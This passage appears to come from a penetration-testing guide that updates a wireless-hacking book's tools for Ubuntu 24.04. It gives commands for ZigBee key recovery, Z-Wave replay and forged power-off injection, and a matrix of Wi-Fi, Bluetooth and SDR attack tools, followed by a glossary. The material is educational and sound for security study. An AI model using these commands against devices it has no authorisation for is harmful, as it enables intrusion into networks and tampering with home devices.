**Setup** — KillerBee is not packaged for Ubuntu; the book's `svn checkout` + Python 2 install is now a `git clone` + Python 3 install against the maintained fork:
```bash
sudo apt install python3-usb python3-crypto python3-gtk2 python3-cairo   # some of these may need pip fallbacks on 24.04
git clone https://github.com/riverloopsec/killerbee.git
cd killerbee && sudo python3 setup.py install
```
Hardware: a **River Loop ApiMote** (successor to the book's GoodFET-based RZ Raven/ApiMote v3) or an Atmel RZUSBSTICK flashed with KillerBee firmware, same as the book.

**Discovery and capture (tool names are unchanged from the book — only the Python runtime changed):**
```bash
sudo zbstumbler -w zigbee-nodes.csv        # active discovery, logs PAN ID/channel/RSSI
sudo zbdump -f 15 -w capture.pcap          # passive capture on channel 15
sudo zbwireshark -c 15                      # live capture piped straight into Wireshark
sudo zbreplay -r capture.pcap -f 15         # replay a captured frame (e.g. a light-switch on/off command)
zbdsniff *.dcf                              # scan captures for an over-the-air network-key provisioning event
```

**ApiMote/GoodFET hardware bring-up (unchanged workflow):**
```bash
git clone https://github.com/travisgoodspeed/goodfet.git goodfet
cd goodfet/client && sudo make link
goodfet.cc info
```

**Memory-dump key recovery (`zbgoodfind`) — the book's capstone technique:** given an encrypted capture plus a raw memory dump pulled from the physical ZigBee chip (via the hardware debug/JTAG interface, same as the book's chapter-13 walkthrough), `zbgoodfind` brute-force-searches the dump for the AES key that decrypts the capture:
```bash
zbgoodfind -h
zbgoodfind -f capture.pcap -r memory-dump.bin -c 15
```
This remains the most reliable ZigBee key-recovery technique when you have physical access to a device, because it sidesteps cryptography entirely — if the device keeps its network key in plaintext RAM/flash (common on constrained IoT silicon), you just have to find it.

### 3.4 Hacking Z-Wave Smart Homes (Chapter 14)

Z-Wave protocol layers, the (historically weak) Z-Wave security model (S0 shared network key, the well-known "S0 key-exchange downgrade" weakness the book documents), and attacks: eavesdropping and packet injection via the **KillerZee** framework running on an `rfcat`-controlled CC1111-based dongle (e.g. a "Yard Stick One").

**Setup — same source-build workflow as the book, now via pip or git on Python 3:**
```bash
pip3 install --user rfcat          # PyPI package now exists; book used a Mercurial clone + python2 setup.py install
# Flash a CC1111 dongle's bootloader with GoodFET, same as the book:
git clone https://github.com/travisgoodspeed/goodfet goodfet && cd goodfet/client && sudo make link
goodfet.cc erase
goodfet.cc flash CCBootloader-rfcat-donsdongle.hex
goodfet.cc verify CCBootloader-rfcat-donsdongle.hex
bootload.py /dev/ttyACM0 erase_all
bootload.py /dev/ttyACM0 download RfCatDonsCCBootloader-<version>.hex
bootload.py /dev/ttyACM0 run

git clone https://github.com/joswr1ght/killerzee.git
cd killerzee && sudo python3 setup.py install
```

**Eavesdropping and replay (tool names unchanged from the book):**
```bash
zwdump -w capture.pcap            # passive capture
zwdump -r capture.pcap            # read back a capture
zwdump -p r1                      # set region/power profile before capture (regulatory region, e.g. US/EU)
zwreplay -r capture.pcap -w 1     # replay a captured frame
```

**Injection (the book's capstone — forging a command to a specific node, e.g. turning off a smart thermostat/lock without the key):**
```bash
zwpoweroff -t <node_home_ID>
```
This works because of the S0 security class's well-documented key-exchange weakness (the network key can be sniffed during device inclusion if the installer is watching, and many deployed devices still fall back to no-security "S0 downgrade" or plaintext framing for compatibility). **Z-Wave's current S2 security class** (mandatory for Z-Wave certification since 2017, using ECDH for key exchange) is not vulnerable to this specific attack — if you're testing a modern Z-Wave deployment, confirm which security class is actually in use before assuming this chapter's attack applies.

---

## Quick-Reference Master Command Matrix for Ubuntu 24.04

| Area | Book Tool | Ubuntu 24.04 Equivalent | Install / Status |
|---|---|---|---|
| Monitor mode | `airmon-ng start wlan0 1` → `mon0` | `sudo airmon-ng check kill && sudo airmon-ng start wlan0` → `wlan0mon` | `apt install aircrack-ng` |
| Discovery | `airodump-ng`, Kismet | Same tool names, same flags | `apt install aircrack-ng kismet` |
| MAC spoofing | `ifconfig ... hw ether` | `macchanger -m <mac> <iface>` | `apt install macchanger` |
| WEP crack | `aireplay-ng` (deauth/arpreplay/fragment/chopchop), `packetforge-ng`, `aircrack-ng` | Identical commands/flags | `apt install aircrack-ng` |
| WEP/WPA automation | `wifite.py` (Python 2) | `wifite` ("wifite2," Python 3) | `apt install wifite` |
| WPA/WPA2 capture | `airodump-ng` + forced deauth | `hcxdumptool` (PMKID + handshake, no deauth needed) | `apt install hcxdumptool hcxtools` |
| WPA/WPA2 crack | `cudaHashcat -m 2500`, `pyrit` | `hashcat -m 22000` (via `hcxpcapngtool` conversion) | `apt install hashcat hcxtools` |
| WPS attack | `wash`, `reaver` | Same names; prefer Pixie Dust (`reaver -K 1` / `bully --pixiewps`) over online brute force | `apt install reaver`; bully often source-build |
| Rogue RADIUS / EAP capture | `hostapd-wpe` | Same tool, now maintained at `aircrack-ng/hostapd-wpe` | source build |
| LEAP crack | `asleap`, `genkeys` | Same tools, same syntax | source build |
| Karma rogue AP | `hostapd-wpe -k` | `hostapd-mana` (handles modern MAC randomization/probe suppression better) | source build |
| ARP spoofing / MITM | `arpspoof`, `ettercap` | Same tools; or unify with `bettercap` | `apt install dsniff ettercap-text-only bettercap` |
| HTTPS downgrade | `sslstrip` | `bettercap` `https.proxy`/`hstshijack` (much less effective vs. HSTS-preloaded sites today) | `apt install bettercap` |
| Soft-AP MITM | `airtun-ng` | Same tool, same flags | `apt install aircrack-ng` |
| Windows post-exploit recon | `netsh wlan show ...` | Unchanged on Windows 10/11 | N/A (target-side) |
| BT Classic scan | `hcitool scan/name/inq` | `bluetoothctl scan on` / `info` | `apt install bluez` |
| BT Classic services | `sdptool browse` | `bluetoothctl info` (lists UUIDs) | `apt install bluez` |
| BT Classic/BLE sniffing | `ubertooth-*` | Same tool names | `apt install ubertooth` |
| BLE scan | `hcitool lescan` | `bluetoothctl scan on` | `apt install bluez` |
| BLE GATT read/write | `gatttool --char-read/write` | `bluetoothctl` GATT menu, or Python 3 `bleak` | `pip3 install bleak` |
| BT Classic PIN crack | `btcrack` | Same, source-build only | source build |
| BLE PIN/LTK crack | `crackle` | Same, source-build only; Legacy Pairing only | source build |
| BD_ADDR spoof | `bdaddr` | Same, source-build only | source build |
| Class-of-device spoof | `hciconfig ... class` | `btmgmt class` | `apt install bluez` |
| OBEX file attacks | `obexftp` | Same tool | `apt install obexftp` |
| SDR spectrum/decode | `gqrx`, `multimon-ng`, GNU Radio | Same tools, directly apt-installable now | `apt install gqrx-sdr rtl-sdr hackrf gnuradio multimon-ng` |
| SDR replay | `hackrf_transfer` | Same tool, same flags | `apt install hackrf` |
| GSM demod (passive, research) | Airprobe | `gr-gsm` (maintained successor) | source build / PPA |
| GSM calibration | `kalibrate-rtl` | Same, source-build only | source build |
| ZigBee framework | KillerBee (Python 2, svn) | KillerBee (Python 3, git) — same tool names (`zbstumbler`, `zbdump`, `zbreplay`, `zbgoodfind`, `zbwireshark`, `zbid`) | git + `python3 setup.py install` |
| Z-Wave framework | KillerZee + rfcat (Python 2) | Same tool names (Python 3); `rfcat` now also on PyPI | `pip3 install rfcat`; KillerZee via git |

---

## Appendix: Glossary of Key Terms

| Term | Meaning |
|---|---|
| **IV** | Initialization Vector — the per-packet nonce WEP prepends to its RC4 key; WEP's 24-bit IV space is small enough to collide quickly under heavy traffic, which is what the ARP-replay attack exploits. |
| **PTW attack** | Pyshkin-Tews-Weinmann — the statistical WEP key-recovery attack `aircrack-ng` implements, needing far fewer IVs than the original FMS attack. |
| **PMK / PMKID** | Pairwise Master Key (derived from the WPA/WPA2 passphrase + SSID) and an identifier for it the AP includes, unencrypted, in the RSN information element — its presence is what lets `hcxdumptool` capture a crackable hash without a client ever connecting. |
| **4-way handshake** | The EAPOL exchange that derives the session's Pairwise Transient Key (PTK) from the PMK; capturing it (or the PMKID) is the prerequisite for offline WPA/WPA2-Personal cracking. |
| **WPS** | Wi-Fi Protected Setup — an 8-digit PIN-based pairing mechanism; its PIN checksum structure lets an attacker brute-force (or, via "Pixie Dust," compute offline from a weak RNG) the PIN far faster than the full keyspace suggests. |
| **EAP** | Extensible Authentication Protocol — the framework WPA-Enterprise/802.1X uses to negotiate one of many authentication methods (MD5, GTC, LEAP, PEAP, TLS, TTLS, FAST) between a supplicant and a RADIUS server. |
| **Rogue AP / Evil Twin** | An attacker-controlled access point impersonating a legitimate SSID (or, for Karma-style attacks, impersonating whatever SSID a client is already looking for) to capture credentials or traffic. |
| **GAP / GATT** | Generic Access Profile / Generic Attribute Profile — the BLE layers governing device discovery/advertising (GAP) and the services-and-characteristics data model used once connected (GATT). |
| **Legacy Pairing vs. LE Secure Connections** | BLE 4.0/4.1 pairing derives its Temporary Key from a short, often-guessable value (PIN, "Just Works" = all zeros), making it crackable (`crackle`); BLE 4.2+ LE Secure Connections uses ECDH key exchange, which isn't vulnerable to that specific attack. |
| **BD_ADDR** | Bluetooth Device Address — the 48-bit hardware identifier for a Classic Bluetooth radio; spoofable on chipsets that expose a BD_ADDR-write command. |
| **PAN Profile** | Personal Area Network Profile — the Bluetooth profile that lets a device act as a network gateway (BNEP over L2CAP); unauthorized access here puts an attacker on the victim's actual IP network. |
| **iBeacon** | Apple's BLE advertising-payload format (UUID + Major + Minor in manufacturer-specific AD data) used for proximity/geofencing; it carries no authentication, so it can be freely cloned or forged. |
| **SDR** | Software-Defined Radio — a radio whose demodulation/decoding happens in software (GNU Radio, etc.) rather than fixed hardware, letting one device (RTL-SDR, HackRF) tune across almost any band the hardware physically covers. |
| **Fixed-code vs. rolling-code remotes** | A fixed-code remote transmits the same bits every time (vulnerable to simple capture-and-replay); a rolling-code remote changes the transmitted value every use via a synchronized counter/PRNG, defeating naive replay. |
| **A5/1** | The (weak) stream cipher used for over-the-air GSM voice/data encryption on many legacy 2G networks; crackable via precomputed rainbow tables given enough captured ciphertext, historically. |
| **IMSI catcher** | A rogue cellular base station that tricks nearby phones into attaching to it (exploiting GSM's lack of network-to-phone authentication) to capture the phone's IMSI and/or intercept traffic — illegal to operate without a spectrum license almost everywhere. |
| **PAN ID** | Personal Area Network Identifier — the 16-bit network identifier ZigBee/802.15.4 devices on the same network share, analogous to an 802.11 BSSID. |
| **Network key vs. link key (ZigBee)** | ZigBee's network key (AES-128) encrypts all NWK-layer traffic network-wide; a link key secures traffic between a specific pair of devices — compromising the network key (often transmitted once, in the clear, during device join) compromises the whole network's confidentiality. |
| **S0 / S2 security class (Z-Wave)** | S0 is Z-Wave's original security class, whose network-key exchange is itself unencrypted at a critical step (sniffable during inclusion) and which many devices can be downgraded away from entirely; S2 (mandatory since 2017) uses ECDH key exchange and isn't vulnerable to the same downgrade/sniff attack. |
| **Home ID (Z-Wave)** | A 32-bit network identifier shared by all nodes in one Z-Wave network, analogous to a PAN ID; combined with a node ID to address a specific command at a specific device. |
